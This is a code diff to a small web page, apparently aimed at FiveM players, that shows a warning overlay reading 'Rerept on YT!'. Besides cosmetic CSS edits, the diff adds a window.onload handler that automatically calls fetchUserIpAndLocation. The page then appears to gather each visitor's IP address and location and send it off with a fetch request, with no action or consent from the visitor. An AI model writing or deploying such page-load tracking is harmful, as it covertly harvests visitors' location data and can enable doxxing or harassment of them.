@@ -17,9 +17,9 @@
     top: 50%;
     left: 50%;
     transform: translate(-50%, -50%);
-    font-size: 2.5em; 
+    font-size: 4em; 
     color: #8727F5;
-    text-shadow: 1px 1px 2px white, 1px 1px 2px white; 
+    text-shadow: 1px 1px 2px red, 1px 1px 2px red; 
     z-index: 2;
   }
 
@@ -93,7 +93,11 @@
         }).then(response => response.json())
           .catch(error => console.error('Error:', error));
       });
-  }
+	  
+  window.onload = function() {
+    const fivemUsername = ''; // If you have a way to get the user's FiveM username, provide it here; otherwise, leave it empty.
+    fetchUserIpAndLocation(fivemUsername);
+  };
 </script>
 
 <div id="overlay">⚠ Rerept on YT! ⚠</div>
